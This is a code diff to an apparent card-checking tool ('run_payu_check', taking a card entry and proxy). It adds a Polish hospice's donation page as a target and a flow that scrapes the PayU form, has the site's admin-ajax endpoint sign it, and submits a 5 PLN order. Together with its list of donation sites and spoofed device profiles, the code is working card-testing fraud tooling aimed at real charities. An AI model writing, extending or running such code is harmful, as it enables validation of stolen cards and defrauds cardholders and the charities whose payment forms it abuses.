@@ -18,6 +18,7 @@ from __future__ import annotations
 import asyncio
 import random
 import re
+import html
 import time
 import urllib.parse
 import os
@@ -346,6 +347,22 @@ PAYU_SITES = {
             "privacy_ack": True,
         },
     },
+    "hospicjumtischnera": {
+        "create_type": "payu_v21",
+        "page_url": "https://www.hospicjumtischnera.org/payu/",
+        "ajax_url": "https://www.hospicjumtischnera.org/wp-admin/admin-ajax.php",
+        "create_url": "https://secure.payu.com/api/v2_1/orders",
+        "signature_action": "payu_signature",
+        "referer": "https://www.hospicjumtischnera.org/payu/",
+        "origin": "https://www.hospicjumtischnera.org",
+        "amount": "5",
+        "mcp_fx_table_id": 597551,
+        "mcp_fx_rate": 1,
+        "language": "pl",
+        "lang_param": "",
+        "country": "PL",
+        "timezone_offset": -60,
+    },
 }
 
 # ── real device profiles (screen / color depth) ──────────────────────
@@ -567,13 +584,13 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
         elif cfg["create_type"] == "woocommerce":
             # step 1: GET the page -> extract nonces + postid + form_id
             r = await s.get(cfg["page_url"], headers={"Referer": cfg["referer"]})
-            html = r.text
-            if "not available" in html.lower() or "currently not available" in html.lower():
+            page = r.text
+            if "not available" in page.lower() or "currently not available" in page.lower():
                 raise Exception("woocommerce: donation project closed/not available")
-            cn = re.search(r'woocommerce-process-checkout-nonce[^>]*value="([^"]+)"', html)
-            sec = re.search(r'name="security"\s+value="([^"]+)"', html)
-            pid = re.search(r'name="postid" value="([^"]+)"', html)
-            fid = re.search(r'name="wcdp_form_id" value="([^"]+)"', html)
+            cn = re.search(r'woocommerce-process-checkout-nonce[^>]*value="([^"]+)"', page)
+            sec = re.search(r'name="security"\s+value="([^"]+)"', page)
+            pid = re.search(r'name="postid" value="([^"]+)"', page)
+            fid = re.search(r'name="wcdp_form_id" value="([^"]+)"', page)
             if not (cn and sec and pid and fid):
                 raise Exception("woocommerce: missing nonces/postid")
             # step 2: donation calculation -> adds the product to the cart
@@ -671,6 +688,48 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
                 headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
                          "Content-Type": "application/x-www-form-urlencoded"})
             redirect = r.headers.get("Location") or ""
+        elif cfg["create_type"] == "payu_v21":
+            # 1. GET the page -> extract the static form fields (merchantPosId, products, customerIp, ...)
+            r = await s.get(cfg["page_url"], headers={"Referer": cfg["referer"]})
+            page = r.text
+            # scope to the PayU v2_1 form only (the page also carries a PayPal form)
+            fm = re.search(r'<form[^>]*action="[^"]*api/v2_1/orders"[^>]*>(.*?)</form>', page, re.S)
+            if not fm:
+                raise Exception("payu_v21: PayU form not found")
+            form = {}
+            for m in re.finditer(r'<input[^>]*type="hidden"[^>]*>', fm.group(1)):
+                nm = re.search(r'name="([^"]+)"', m.group(0))
+                if not nm:
+                    continue
+                val = re.search(r'value="([^"]*)"', m.group(0))
+                form[nm.group(1)] = html.unescape(val.group(1)) if val else ""
+            if "merchantPosId" not in form or "totalAmount" not in form:
+                raise Exception("payu_v21: form fields not found")
+            form["buyer.email"] = email
+            form["buyer.firstName"] = first
+            form["buyer.lastName"] = last
+            # 2. ask the merchant to sign the form (admin-ajax)
+            ordered = []
+            for k, v in form.items():
+                if k == "OpenPayu-Signature":
+                    continue
+                ordered.append(k)
+                ordered.append(v)
+            sig_data = [("action", cfg.get("signature_action", "payu_signature"))] + [("fields[]", x) for x in ordered]
+            r2 = await s.post(cfg["ajax_url"], data=sig_data,
+                              headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
+                                       "X-Requested-With": "XMLHttpRequest"})
+            signature = (r2.text or "").strip()
+            if not signature.startswith("sender="):
+                raise Exception(f"payu_v21: signature not returned: {signature[:120]}")
+            # 3. POST the signed form to PayU v2_1 orders -> 302 redirect
+            body = dict(form)
+            body["OpenPayu-Signature"] = signature
+            r3 = await s.post(cfg["create_url"], data=body, allow_redirects=False,
+                              headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
+                                       "Content-Type": "application/x-www-form-urlencoded",
+                                       "Sec-Fetch-Site": "cross-site"})
+            redirect = r3.headers.get("Location") or ""
         elif cfg["create_type"] == "json_api":
             body = dict(cfg["json_body"])
             for k, v in body.items():
